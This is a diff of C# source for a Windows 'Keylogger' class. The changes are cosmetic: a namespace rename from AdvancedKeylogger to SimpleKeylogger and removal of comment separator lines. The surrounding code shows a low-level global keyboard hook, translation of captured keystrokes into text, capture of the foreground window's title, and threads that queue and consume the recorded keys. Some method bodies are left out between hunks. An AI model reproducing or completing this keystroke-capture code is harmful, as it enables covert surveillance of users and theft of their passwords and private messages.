@@ -7,22 +7,18 @@ using System.Runtime.Versioning;
 using System.Text;
 using System.Threading;
 
-namespace AdvancedKeylogger
+namespace SimpleKeylogger
 {
     [SupportedOSPlatform("windows")]
     public sealed class Keylogger : IDisposable
     {
-        // ---------------------------------------------------------------
         //  Constants
-        // ---------------------------------------------------------------
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_SYSKEYDOWN = 0x0104;
         private const int WM_QUIT = 0x0012;
 
-        // ---------------------------------------------------------------
         //  P/Invoke declarations
-        // ---------------------------------------------------------------
         [DllImport("user32.dll", SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
             LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -65,9 +61,7 @@ namespace AdvancedKeylogger
         // Delegate for the low-level keyboard procedure
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        // ---------------------------------------------------------------
         //  Structures
-        // ---------------------------------------------------------------
         [StructLayout(LayoutKind.Sequential)]
         private struct KBDLLHOOKSTRUCT
         {
@@ -78,9 +72,7 @@ namespace AdvancedKeylogger
             public IntPtr dwExtraInfo;
         }
 
-        // ---------------------------------------------------------------
         //  Event arguments
-        // ---------------------------------------------------------------
         public sealed class KeyCapturedEventArgs : EventArgs
         {
             public string Text { get; }
@@ -102,9 +94,7 @@ namespace AdvancedKeylogger
             }
         }
 
-        // ---------------------------------------------------------------
         //  Special key name dictionary
-        // ---------------------------------------------------------------
         private static readonly Dictionary<uint, string> SpecialKeyNames = new()
         {
             [0x08] = "[Backspace]", [0x09] = "[Tab]",        [0x0D] = "[Enter]",
@@ -127,9 +117,7 @@ namespace AdvancedKeylogger
             [0x69] = "[Num 9]",
         };
 
-        // ---------------------------------------------------------------
         //  Private fields
-        // ---------------------------------------------------------------
         private readonly CancellationTokenSource _cts = new();
         private Thread? _hookThread;
         private Thread? _consumerThread;
@@ -150,9 +138,7 @@ namespace AdvancedKeylogger
 
         private enum State { Stopped, Running, Stopping }
 
-        // ---------------------------------------------------------------
         //  Public API
-        // ---------------------------------------------------------------
         public void Start(Action<KeyCapturedEventArgs>? callback = null)
         {
             lock (_stateLock)
@@ -216,9 +202,7 @@ namespace AdvancedKeylogger
             _cts.Dispose();
         }
 
-        // ---------------------------------------------------------------
         //  Hook thread
-        // ---------------------------------------------------------------
         private void HookThreadProc()
         {
             _hookThreadNativeId = GetCurrentThreadId();
@@ -257,9 +241,7 @@ namespace AdvancedKeylogger
             _hookHandle = IntPtr.Zero;
         }
 
-        // ---------------------------------------------------------------
         //  Hook callback
-        // ---------------------------------------------------------------
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
@@ -297,9 +279,7 @@ namespace AdvancedKeylogger
             return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
         }
 
-        // ---------------------------------------------------------------
         //  Consumer thread
-        // ---------------------------------------------------------------
         private void ConsumerThreadProc()
         {
             try
@@ -316,9 +296,7 @@ namespace AdvancedKeylogger
             }
         }
 
-        // ---------------------------------------------------------------
         //  Keyboard translation
-        // ---------------------------------------------------------------
         private string TranslateKey(uint vkCode, uint scanCode, uint flags, bool isSysKey)
         {
             uint threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
@@ -350,9 +328,7 @@ namespace AdvancedKeylogger
             return $"[VK:{vkCode}]";
         }
 
-        // ---------------------------------------------------------------
         //  Window title helper
-        // ---------------------------------------------------------------
         private static string GetWindowTitle(IntPtr hWnd)
         {
             if (hWnd == IntPtr.Zero) return string.Empty;
@@ -361,9 +337,7 @@ namespace AdvancedKeylogger
             return sb.ToString();
         }
 
-        // ---------------------------------------------------------------
         //  Message pump P/Invoke
-        // ---------------------------------------------------------------
         [DllImport("user32.dll")]
         private static extern bool PostThreadMessage(uint idThread, uint Msg,
             IntPtr wParam, IntPtr lParam);
